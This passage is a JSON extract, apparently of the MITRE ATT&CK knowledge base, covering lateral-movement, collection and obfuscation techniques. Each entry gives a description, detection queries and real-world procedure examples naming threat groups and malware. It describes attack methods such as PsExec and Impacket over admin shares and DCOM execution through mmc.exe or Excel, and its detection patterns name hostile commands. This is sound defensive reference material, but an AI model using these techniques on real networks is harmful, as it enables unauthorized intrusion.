      "Net Crawleruses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement.[56]",
      "NotPetyacan usePsExec, which interacts with theADMIN$network share to execute commands on remote systems.[57][58][59]",
      "Olympic DestroyerusesPsExecto interact with theADMIN$network share to execute commands on remote systems.[60][59]",
      "DuringOperation MidnightEclipse, threat actors used SMB to pivot internally in victim networks.[61]",
      "DuringOperation Wocao, threat actors usedImpacket's smbexec.py as well as accessing the C$ and IPC$ shares to move laterally.[62]",
      "Orangewormhas copied its backdoor across open network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, and E$WINDOWS.[46]",
      "Playhas usedCobalt Striketo move laterally via SMB.[63]",
      "PsExec, a tool that has been used by adversaries, writes programs to theADMIN$network share to execute commands on remote systems.[59]",
      "RansomHubcan use credentials provided in its configuration to move laterally from the infected machine over SMBv2.[64]",
      "reGeorghas the ability to tunnel SMB sessions.[65]",
      "TheReginmalware platform can use Windows admin shares to move laterally.[66]",
      "Royalcan use SMB to connect to move laterally.[67]",
      "Ryukhas used the C$ network share for lateral movement.[68]",
      "Sandworm Teamhas copied payloads to theADMIN$share of remote systems and runnet useto connect to network shares.[4][69]",
      "Shamoonaccesses network share(s), enables share access to the target device, copies an executable payload to the target system, and uses aScheduled Task/Jobto execute the malware.[70]",
      "During theSolarWinds Compromise,APT29used administrative accounts to connect over SMB to targeted users.[71]",
      "Storm-1811has attempted to move laterally in victim environments via SMB usingImpacket.[72]",
      "Stuxnetpropagates to available network shares.[73]",
      "Threat Group-1314actors mapped network drives usingnet use.[74]",
      "ToddyCathas used locally mounted network shares for lateral movement through targated environments.[75]",
      "Turlausednet usecommands to connect to lateral systems within a network.[76]",
      "Velvet Anthas transferred tools within victim environments using SMB.[77]",
      "Wizard Spiderhas used SMB to drop Cobalt Strike Beacon on a domain controller for lateral movement.[78][79]",
      "Zoxhas the ability to use SMB for communication.[80]",
      "zwShellhas been copied over network shares to move laterally.[81]"
    ]
  },
  "T1021.003": {
    "Name": "Remote Services:Distributed Component Object Model",
    "Description": "Adversaries may useValid Accountsto interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.[1][2]Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.[3]By default, only Administrators may remotely activate and launch COM objects through DCOM.[4]Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications[5]as well as other Windows objects that contain insecure methods.[6][7]DCOM can also execute macros in existing documents[8]and may also invokeDynamic Data Exchange(DDE) execution directly through a COM created instance of a Microsoft Office application[9], bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting withWindows Management Instrumentation.[10]",
    "Detects": [
      "Monitor for COM objects loading DLLs and other modules not typically associated with the application.[5]Note: Sysmon Event ID 7 (Image loaded) can be used to monitor for suspicious DLLs loaded by the DCOM Server Process Launcher which runs inside of svchost.exe. This is a particularly noisy event and can generate a large volume of data, so we recommend baselining and filtering out any known benign svchost.exe module loads that occur as part of its typical operation.sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=7| search ImageLoaded=\"\\.dll\" ParentImage=\"dcomlaunch.exe\"| stats count by ImageLoaded, ParentImage, User, Computer, _time| eval suspicious_load=if(count > threshold, \"suspicious\", \"normal\")| where suspicious_load=\"suspicious\"| table _time, ImageLoaded, ParentImage, User, Computer, suspicious_load",
      "Monitor for newly constructed network connections that may useValid Accountsto interact with remote machines using Distributed Component Object Model (DCOM). Monitor for any influxes or abnormal increases in DCOM related Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic (typically over port 135).Remote Procedure Call (RPC) traffic, especially over port 135, used for DCOM communication. Look for patterns indicating high volumes of RPC calls or connections between systems.Note: Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on RPC network flows. Traffic to the RPC Endpoint Mapper will always have the destination port of 135. Assuming success, RPC traffic will continue to the endpoint. The endpoint and the client both bind to dynamically assigned ports (on Windows, this is typically greater than 49152). The traffic between the client and endpoint can be detected by looking at traffic to 135 followed by traffic where the source and destination ports are at least 49152.sourcetype=\"seek\"| search dest_port=135 protocol=\"DCE/RPC\"| stats count by src_ip, dest_ip, dest_port, _time| eval rpc_activity=if(count > threshold AND src_ip NOT IN (\"trusted_ips\"), \"suspicious\", \"normal\")| where rpc_activity=\"suspicious\"| table _time, src_ip, dest_ip, dest_port, rpc_activity",
      "Monitor for newly executed processes associated with DCOM activity, especially those invoked by a user different than the one currently logged on. Enumeration of COM objects, viaQuery RegistryorPowerShell, may also precede malicious use.[1][6]The Microsoft Management Console (mmc.exe) can be by used by threat actors used to spawn arbitrary processes through DCOM. The typical process tree for this method looks like: svchost.exe —> mmc.exe —>.exe.Accordingly, look for process creation events of mmc.exe in conjunction with the -Embedding command-line argument, along with suspicious child processes that can be used for malicious purposes, such as cmd.exe, reg.exe, etc.Similar to the Microsoft Management Console, Excel can also be used to execute processes through DCOM. In this case, the typical process tree looks like: svchost.exe —> excel.exe —>.exe.Look for process creation events of excel.exe in conjunction with the /automation -Embedding command-line argument, along with suspicious child processes that can be used for malicious purposes, such as cmd.exe, reg.exe, etc.sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1| search ParentImage=\"dcomlaunch.exe\" OR CommandLine=\"dcom\"| stats count by ParentImage, CommandLine, User, Computer, _time| eval suspicious_process=if(count > threshold, \"suspicious\", \"normal\")| where suspicious_process=\"suspicious\"| table _time, ParentImage, CommandLine, User, Computer, suspicious_process"
    ],
    "Procedure Examples": [
      "Cobalt Strikecan deliver Beacon payloads for lateral movement by leveraging remote COM execution.[11]",
      "Empirecan utilizeInvoke-DCOMto leverage remote COM execution for lateral movement.[12]",
      "SILENTTRINITYcan useSystemnamespace methods to execute lateral movement using DCOM.[13]"
    ]
  },
  "T1021.004": {
    "Name": "Remote Services:SSH",
    "Description": "Adversaries may useValid Accountsto log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. On ESXi, SSH can be enabled either directly on the host (e.g., viavim-cmd hostsvc/enable_ssh) or via vCenter.[1][2][3]The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user (i.e.,SSH Authorized Keys).",
    "Detects": [
      "Monitor for user accounts logged into systems that may useValid Accountsto log into remote machines using Secure Shell (SSH). For example, on Linux systems SSH logon activity can be found in the logs located in/var/log/auth.logor/var/log/securedepending on the distro you are using.For Linux systems, the Audit framework (auditd) can be used to monitor any writes to SSH log files that store information about logged in accounts such as/var/log/auth.log.For macOS systems (10.12+), Unified Logs can be queried to show SSH daemon (sshd) messages that include information on logged in accounts. The following command-line can be used to query the last hour’s worth of unified logs in this manner:log show -info --debug --predicate 'processImagePath CONTAINS \"sshd\" AND eventMessage CONTAINS \"Accepted\"' --last 1h | grep sshdsourcetype=\"/var/log/auth.log\" OR source=\"/var/log/secure\"| search message=\"Accepted password\" OR message=\"Accepted publickey\"| stats count by user, src_ip, dest_host, _time| eval ssh_anomaly=if(count > threshold OR dest_host IN (\"sensitive_hosts\"), \"suspicious\", \"normal\")| where ssh_anomaly=\"suspicious\"| table _time, user, src_ip, dest_host, ssh_anomalyFor ESXi systems, SSH logins will be recorded in the following log files:/var/log/shell.log,/var/log/hostd.log,/var/log/auth.log, and/var/log/vobd.log.[1]",
      "Monitor for newly constructed network connections (typically port 22) that may useValid Accountsto log into remote machines using Secure Shell (SSH). Use of SSH may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH.Network Analysis Frameworks such as Zeek can be used to capture, decode, and alert on network traffic. Accordingly, they can be used to look for the creation of SSH network connections.sourcetype=\"zeek\" dest_port=22 protocol=\"tcp\"| stats count by src_ip, dest_ip, dest_port, _time| eval ssh_connection_anomaly=if(count > threshold OR src_ip IN (\"untrusted_ips\"), \"suspicious\", \"normal\")| where ssh_connection_anomaly=\"suspicious\"| table _time, src_ip, dest_ip, ssh_connection_anomaly",
      "Monitor for newly executed processes that may useValid Accountsto log into remote machines using Secure Shell (SSH). For example, on macOS systemslog show --predicate 'process = \"sshd\"'can be used to review incoming SSH connection attempts for suspicious activity. The commandlog show --info --predicate 'process = \"ssh\" or eventMessage contains \"ssh\"'can be used to review outgoing SSH connection activity.[30]For Linux systems, the Audit framework (auditd) can be used to monitor for the creation of SSH related processes such as ssh.For macOS systems (10.12+), the above command can be used to look through the Unified Logs for SSH connection activity, though we also recommend including the \"—debug\" parameter to ensure that all relevant data is returned:log show --info --debug --predicate 'process = \"ssh\" or eventMessage contains \"ssh\"'sourcetype=\"/var/log/audit/audit.log\" OR sourcetype=\"/var/log/auth.log\"| search parent_process=\"sshd\" AND (process=\"sudo\" OR process=\"sensitive_command\")| stats count by user, process, parent_process, _time| eval process_anomaly=if(count > threshold, \"suspicious\", \"normal\")| where process_anomaly=\"suspicious\"| table _time, user, process, parent_process, process_anomaly"
    ],
    "Procedure Examples": [
      "APT39used secure shell (SSH) to move laterally among their targets.[4]",
      "APT5has used SSH for lateral movement in compromised environments including for enabling access to ESXi host servers.[5]",
      "Aquatic Pandaused SSH with captured user credentials to move laterally in victim environments.[6]",
      "BlackTechhas used Putty for remote access.[7]",
      "During theC0032campaign,TEMP.Velesrelied on encrypted SSH-based tunnels to transfer tools and for remote command/program execution.[8]",
      "Cobalt Strikecan SSH to a remote service.[9][10]",
      "DuringCutting Edge, threat actors used SSH for lateral movement.[11]",
      "Empirecontains modules for executing commands over SSH as well as in-memory VNC agent injection.[12]",
      "FIN13has remotely accessed compromised environments via secure shell (SSH) for lateral movement.[13]",
      "FIN7has used SSH to move laterally through victim environments.[14]",
      "Fox Kittenhas used the PuTTY and Plink tools for lateral movement.[15]",
      "GCMANuses Putty for lateral movement.[16]",
      "Indrik Spiderhas used SSH for lateral movement.[17]",
      "Kinsinghas used SSH for lateral movement.[18]",
      "Lazarus Groupused SSH and the PuTTy PSCP utility to gain access to a restricted segment of a compromised network.[19]",
      "Leviathanused ssh for internal reconnaissance.[20]",
      "Leviathanused SSH brute force techniques to move laterally within victim environments duringLeviathan Australian Intrusions.[21]",
      "menuPasshas used Putty Secure Copy Client (PSCP) to transfer data.[22]",
      "OilRighas used Putty to access compromised systems.[23]",
      "reGeorgcan communicate using SSH through an HTTP tunnel.[24]",
      "Rockehas spread its coinminer via SSH.[25]",
      "Salt Typhoonhas modified the loopback address on compromised switches and used them as the source of SSH connections to additional devices within the target environment, allowing them to bypass access control lists (ACLs).[26]",
      "Storm-1811has used OpenSSH to establish an SSH tunnel to victims for persistent access.[27]",
      "TeamTNThas used SSH to connect back to victim machines.[28]TeamTNThas also used SSH to transfer tools and payloads onto victim hosts and execute them.[29]"
    ]
  },
  "T1021.005": {
    "Name": "Remote Services:VNC",
    "Description": "Adversaries may useValid Accountsto remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\"remote framebuffer\") protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.[1]VNC differs fromRemote Desktop Protocolas VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.[2][3]Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.[4][5][6][7][8][9]",
    "Detects": [
      "Monitor for user accounts logged into systems that may useValid Accountsto remotely control machines using Virtual Network Computing (VNC). For example, on macOS systemslog show --predicate 'process = \"screensharingd\" and eventMessage contains \"Authentication:\"'can be used to review incoming VNC connection attempts for suspicious activity.[24]sourcetype=\"vnc_logs\"| search message=\"Authentication succeeded\" OR message=\"Authentication failed\"| stats count by user, src_ip, dest_host, _time| eval vnc_anomaly=if(count > threshold OR dest_host IN (\"critical_hosts\"), \"suspicious\", \"normal\")| where vnc_anomaly=\"suspicious\"| table _time, user, src_ip, dest_host, vnc_anomaly",
      "Monitor for newly constructed network connections that may useValid Accountsto remotely control machines using Virtual Network Computing (VNC). Use of VNC may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using VNC.sourcetype=\"network_traffic\" dest_port=5900 protocol=\"tcp\"| stats count by src_ip, dest_ip, dest_port, _time| eval vnc_connection_anomaly=if(count > threshold OR src_ip IN (\"untrusted_ips\"), \"suspicious\", \"normal\")| where vnc_connection_anomaly=\"suspicious\"| table _time, src_ip, dest_ip, vnc_connection_anomaly",
      "Monitor for newly executed processes that may useValid Accountsto remotely control machines using Virtual Network Computing (VNC). For example, on macOS systems thescreensharingdprocess may be related to VNC connection activity.[24]source=\"/var/log/audit/audit.log\" OR source=\"/var/log/vncserver.log\"| search parent_process=\"vncserver\" OR parent_process=\"screensharingd\"| stats count by user, process, parent_process, _time| eval process_anomaly=if(count > threshold, \"suspicious\", \"normal\")| where process_anomaly=\"suspicious\"| table _time, user, process, parent_process, process_anomaly"
    ],
    "Procedure Examples": [
      "Carberpcan start a remote VNC session by downloading a new plugin.[10]",
      "DanBotcan use VNC for remote access to targeted systems.[11]",
      "FIN7has used TightVNC to control compromised hosts.[12]",
      "Fox Kittenhas installed TightVNC server and client on compromised servers and endpoints for lateral movement.[13]",
      "Gamaredon Grouphas used VNC tools, including UltraVNC, to remotely interact with compromised hosts.[14][15][16]",
      "GCMANuses VNC for lateral movement.[17]",
      "Latrodectushas routed C2 traffic using Keyhole VNC.[18]",
      "Protonuses VNC to connect into systems.[19]",
      "TrickBothas used a VNC module to monitor the victim and collect information to pivot to valuable systems on the network[20][21]",
      "WarzoneRAThas the ability of performing remote desktop access via a VNC console.[22]",
      "ZxShellsupports functionality for VNC sessions.[23]"
    ]
  },
  "T1021.006": {
    "Name": "Remote Services:Windows Remote Management",
    "Description": "Adversaries may useValid Accountsto interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).[1]It may be called with thewinrmcommand or by any number of programs such as PowerShell.[2]WinRM  can be used as a method of remotely interacting withWindows Management Instrumentation.[3]",
    "Detects": [
      "Monitor executed commands and arguments that may invoke a WinRM script to correlate it with other related events.[15]sourcetype=\"WinEventLog:Security\" EventCode=4688| search ParentImage=\"winrm\" OR ParentImage=\"powershell\"| stats count by AccountName, NewProcessName, CommandLine, ParentProcessName, _time| where count > 1| eval suspicious=if(match(CommandLine, \"(Invoke-Command|Invoke-Expression|Base64EncodedPayload)\"), \"suspicious\", \"normal\")| where suspicious=\"suspicious\"| table _time, AccountName, NewProcessName, CommandLine, ParentProcessName, suspicious",
      "Monitor for user accounts logging into the system viaValid Accountsto interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.sourcetype=\"WinEventLog:Security\" EventCode=4624| search LogonType=3 (WorkstationName=\"*\" AND LogonProcessName=\"User32\") | stats count by AccountName, IpAddress, WorkstationName, _time| eval suspicious_login=if(count > threshold OR AccountName IN (\"sensitive_accounts\"), \"suspicious\", \"normal\")| where suspicious_login=\"suspicious\"| table _time, AccountName, IpAddress, WorkstationName, suspicious_login",
      "Monitor for newly constructed network connections using Windows Remote Management (WinRM), such as remote WMI connection attempts (typically over port 5985 when using HTTP and 5986 for HTTPS).sourcetype=network dest_port IN (5985, 5986) protocol=\"tcp\"| stats count by src_ip, dest_ip, dest_port, _time| eval network_anomaly=if(count > threshold OR src_ip IN (\"untrusted_ips\"), \"suspicious\", \"normal\")| where network_anomaly=\"suspicious\"| table _time, src_ip, dest_ip, dest_port, network_anomaly",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on RPC network flows.When a Windows Remote Management connection is opened, the client sends HTTP requests to port 5985 for HTTP or 5986 for HTTPS on the target host. Each HTTP(S) request to the URI \"/wsman\" is called, and other information is set in the headers. Depending on the operation, the HTTP method may vary (i.e., GET, POST, etc.). This analytic would detect Remote PowerShell, as well as other communications that rely on WinRM. Additionally, it outputs the executable on the client host, the connection information, and the hostname of the target host. Look for network connections to port 5985 and 5986. To really decipher what is going on, these outputs should be fed into something that can do packet analysis.Note: Traffic to the RPC Endpoint Mapper will always have the destination port of 135. Assuming success, RPC traffic will continue to the endpoint. The endpoint and the client both bind to dynamically assigned ports (on Windows, this is typically greater than 49152). The traffic between the client and endpoint can be detected by looking at traffic to 135 followed by traffic where the source and destination ports are at least 49152.",
      "Monitor for newly executed processes that may useValid Accountsto interact with remote systems using Windows Remote Management (WinRM), as well as service processes such aswmiprvse.exeon destination hosts.sourcetype=\"WinEventLog:Security\" EventCode=4688| search ParentImage=\"winrm\" OR ParentImage=\"powershell\"| stats count by AccountName, NewProcessName, CommandLine, ParentProcessName, _time| where match(CommandLine, \"(Invoke-Command|net user|reg add|reg delete)\")| table _time, AccountName, NewProcessName, CommandLine, ParentProcessName",
      "Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior.sourcetype=\"WinEventLog:System\" EventCode=7045| search ServiceName=\"WinRM\"| stats count by AccountName, ServiceName, ServiceFileName, _time| where count > 1| eval service_change=if(match(ServiceFileName, \"winrm.exe\"), \"suspicious\", \"normal\")| where service_change=\"suspicious\"| table _time, AccountName, ServiceName, ServiceFileName, service_change"
    ],
    "Procedure Examples": [
      "Brute Ratel C4can use WinRM for pivoting.[4]",
      "Chimerahas used WinRM for lateral movement.[5]",
      "Cobalt Strikecan useWinRMto execute a payload on a remote host.[6][7]",
      "FIN13has leveragedWMIto move laterally within a compromised network via application servers and SQL servers.[8]",
      "DuringOperation MidnightEclipse, threat actors used WinRM to move laterally in targeted networks.[9]",
      "SILENTTRINITYtracksTrustedHostsand can move laterally to these targets via WinRM.[10]",
      "During theSolarWinds Compromise,APT29used WinRM via PowerShell to execute commands and payloads on remote hosts.[11]",
      "Threat Group-3390has used WinRM to enable remote execution.[12]",
      "Wizard Spiderhas used Window Remote Management to move laterally through a victim network.[13]"
    ]
  },
  "T1021.007": {
    "Name": "Remote Services:Cloud Services",
    "Description": "Adversaries may log into accessible cloud services within a compromised environment usingValid Accountsthat are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user.Many enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g.,Cloud API), using commands such asConnect-AZAccountfor Azure PowerShell,Connect-MgGraphfor Microsoft Graph PowerShell, andgcloud auth loginfor the Google Cloud CLI.In some cases, adversaries may be able to authenticate to these services viaApplication Access Tokeninstead of a username and password.",
    "Detects": [
      "Monitor for newly constructed logon behavior to cloud services. For example, in Azure AD, consider using Identity Protection to monitor for suspicious login behaviors to cloud resources.[4]sourcetype=\"azure:signinlogs\" OR sourcetype=\"google:admin_audit\" OR sourcetype=\"o365:audit\"| stats count by UserPrincipalName, ClientIP, _time, LoginStatus| eval suspicious=if(LoginStatus=\"failure\" OR match(ClientIP, \"untrusted_ip_pattern\"), \"suspicious\", \"normal\")| where suspicious=\"suspicious\"| table _time, UserPrincipalName, ClientIP, LoginStatus, suspicious"
    ],
    "Procedure Examples": [
      "APT29has leveraged compromised high-privileged on-premises accounts synced to Office 365 to move laterally into a cloud environment, including through the use of Azure AD PowerShell.[1]",
      "DuringC0027,Scattered Spiderused compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.[2]",
      "DuringC0027,Scattered Spiderused compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.[2]Scattered Spider has also leveraged pre-existing AWS EC2 instances for lateral movement and data collection purposes.[3]"
    ]
  },
  "T1021.008": {
    "Name": "Remote Services:Direct Cloud VM Connections",
    "Description": "Adversaries may leverageValid Accountsto log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through theCloud API, such as Azure Serial Console[1], AWS EC2 Instance Connect[2][3], and AWS System Manager.[4].Methods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access.Adversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment.[5]These connections typically provide direct console access to the VM rather than the execution of scripts (i.e.,Cloud Administration Command).",
    "Detects": [
      "Monitor cloud audit logs and host logs for logon session events. These can be found in CloudTrail, Unified Audit Logs, Windows Event Logs and/var/log/auth.logor/var/log/securefor Linux systems. Monitor direct cloud VM logins through native services, such as Azure Serial Console or AWS EC2 Instance Connect, especially focusing on privileged access or access attempts that deviate from established baselines. Identify unexpected or unauthorized access patterns, such as logins from untrusted IP addresses, irregular times, or unauthorized users accessing sensitive VMs.sourcetype=\"azure:activity\" OR sourcetype=\"aws:cloudtrail\"| search EventName=\"SerialConsoleConnect\" OR EventName=\"InstanceConnect\"| stats count by UserIdentity.Arn, SourceIPAddress, EventTime, EventName| eval suspicious=if(match(SourceIPAddress, \"untrusted_ip_pattern\") OR count > threshold_limit, \"suspicious\", \"normal\")| where suspicious=\"suspicious\"| table EventTime, UserIdentity.Arn, SourceIPAddress, EventName, suspicious"
    ],
    "Procedure Examples": [
      "If direct virtual machine connections are not required for administrative use, disable these connection types where feasible.",
      "Limit which users are allowed to access compute infrastructure via cloud native methods."
    ]
  },
  "T1025": {
    "Name": "Data from Removable Media",
    "Description": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality withincmdmay be used to gather information.Some adversaries may also useAutomated Collectionon removable media.",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be taken to collect files from a system's connected removable media. For example, data may be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.",
      "Monitor for unexpected/abnormal file accesses to removable media (optical disk drive, USB memory, etc.) connected to the compromised system."
    ],
    "Procedure Examples": [
      "AppleSeedcan find and collect data from removable media devices.[1][2]",
      "AnAPT28backdoor may collect the entire contents of an inserted USB device.[3]",
      "Aria-bodyhas the ability to collect data from USB devices.[4]",
      "BADNEWScopies files with certain extensions from USB devices toa predefined directory.[5]",
      "CosmicDukesteals user files from removable media with file extensions and keywords that match a predefined list.[6]",
      "Crimsoncontains a module to collect data from removable drives.[7][8]",
      "Crutchcan monitor removable drives and exfiltrate files matching a given extension list.[9]",
      "Explosivecan scan all .exe files located in the USB drive.[10]",
      "FLASHFLOODsearches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive bySPACESHIP.[11]",
      "TheFunnyDreamFilePakMonitor component has the ability to collect files from removable devices.[12]",
      "AGamaredon Groupfile stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.[13][14]",
      "GravityRATsteals files based on an extension list if a USB drive is connected to the system.[15]",
      "InvisiMolecan collect jpeg files from connected MTP devices.[16]",
      "Machetecan find, encrypt, and upload files from fixed and removable drives.[17][18]",
      "MgBotincludes modules capable of gathering information from USB thumb drives and CD-ROMs on the victim machine given a list of provided criteria.[19]",
      "ObliqueRAThas the ability to extract data from removable devices connected to the endpoint.[20]",
      "OilRighas used Wireshark’s usbcapcmd utility to capture USB traffic.[21]",
      "Prikormkacontains a module that collects documents with certain extensions from removable media or fixed drives connected via USB.[22]",
      "Ramsaycan collect data from removable media and stage it for exfiltration.[23]",
      "Remsechas a package that collects documents from any inserted USB sticks.[24]",
      "Roversearches for files on attached removable drives based on a predefined list of file extensions every five seconds.[25]",
      "TajMahalhas the ability to steal written CD images and files of interest from previously connected removable drives when they become available again.[26]",
      "TurlaRPC backdoors can collect files from USB thumb drives.[27][28]",
      "Once a removable media device is inserted back into the first victim,USBStealercollects data from it that was exfiltrated from a second victim.[29][30]"
    ]
  },
  "T1027": {
    "Name": "Obfuscated Files or Information",
    "Description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open andDeobfuscate/Decode Files or InformationforUser Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.[1]Adversaries may also use compressed or archived scripts, such as JavaScript.Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.[2]Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.[3]Adversaries may also abuseCommand Obfuscationto obscure commands executed from payloads or directly viaCommand and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.[4][5][6]",
    "Detects": [
      "The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.",
      "Monitor executed commands and arguments for indicators of obfuscation and potentially suspicious syntax such as uninterpreted escape characters (e.g.,^).Also monitor command-lines for syntax-specific signs of obfuscation, such as variations of arguments associated with encoding.",
      "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).",
      "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc.File-based signatures may be capable of detecting code obfuscation depending on the methods used.[185][186][187]",
      "Monitoring module loads, especially those not explicitly included in import tables, may highlight obfuscated code functionality. Dynamic malware analysis may also expose signs of code obfuscation.[186]",
      "Monitor and analyze calls to functions such asGetProcAddress()that are associated with malicious code obfuscation.[185]",
      "Monitor for newly executed processes that may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.",
      "Monitor executed scripts for indicators of obfuscation and potentially suspicious command syntax, such as uninterpreted escape characters (e.g.,^).Also monitor commands within scripts for syntax-specific signs of obfuscation, such as encoded or otherwise unreadable blobs of characters.",
      "Monitor for the creation of Registry values that may highlight storage of malicious data such as commands or payloads.",
      "Monitor for the creation of WMI Objects and values that may highlight storage of malicious data such as commands or payloads."
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamused heavily obfuscated code withIndustroyerin its Windows Notepad backdoor.[7]",
      "Action RAT's commands, strings, and domains can be Base64 encoded within the payload.[8]",
      "Most of the strings inADVSTORESHELLare encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed, presumably to avoid detection in memory.[9][10]",
      "Agent Teslahas had its code obfuscated in an apparent attempt to make analysis difficult.[11]Agent Teslahas used the Rijndael symmetric encryption algorithm to encrypt strings.[12]",
      "Amadeyhas obfuscated strings such as antivirus vendor names, domains, files, and others.[13]",
      "Anchorhas obfuscated code with stack strings and string encryption.[14]",
      "AppleJeushas XOR-encrypted collected system information prior to sending to a C2.AppleJeushas also used the open source ADVObfuscation library for its components.[15]",
      "AppleSeedhas the ability to Base64 encode its payload and custom encrypt API calls.[16]",
      "APT-C-36has used ConfuserEx to obfuscate its variant ofImminent Monitor, compressed payload and RAT packages, and password protected encrypted email attachments to avoid detection.[17]",
      "APT3obfuscates files or information to help evade defensive measures.[18]",
      "APT37obfuscates strings and payloads.[19][20][21]",
      "APT41used VMProtected binaries in multiple intrusions.[22]",
      "Avaddonhas used encrypted strings.[23]",
      "AvosLockerhas used XOR-encoded strings.[24]",
      "BackdoorDiplomacyhas obfuscated tools and malware it uses with VMProtect.[25]",
      "BlackOasis's first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.[26]",
      "BoomBoxcan encrypt data using AES prior to exfiltration.[27]",
      "BoxCaonused the \"StackStrings\" obfuscation technique to hide malicious functionalities.[28]",
      "BPFDoorcan require a password to activate the backdoor and uses RC4 encryption or static library encryptionlibtomcrypt.[29]",
      "Brute Ratel C4has used encrypted payload files and maintains an encrypted configuration structure in memory.[30][31]",
      "Bumblebeehas been delivered as password-protected zipped ISO files and used control-flow-flattening to obfuscate the flow of functions.[32][33][34]",
      "Bundlorehas obfuscated data with base64, AES, RC4, and bz2.[35]",
      "BUSHWALKcan encrypt the resulting data generated from C2 commands with RC4.[36]",
      "DuringC0015, the threat actors used Base64-encoded strings.[37]",
      "DuringC0017,APT41broke malicious binaries, includingDEADEYEandKEYPLUG, into multiple sections on disk to evade detection.[38]",
      "Carbanakencrypts strings to make analysis more difficult.[39]",
      "Carbonencrypts configuration files and tasks for the malware to complete using CAST-128 algorithm.[40][41]",
      "CARROTBALLhas used a custom base64 alphabet to decode files.[42]",
      "CHIMNEYSWEEPcan use a custom Base64 alphabet to encode an API decryption key.[43]",
      "TheClamblingexecutable has been obfuscated when dropped on a compromised host.[44]",
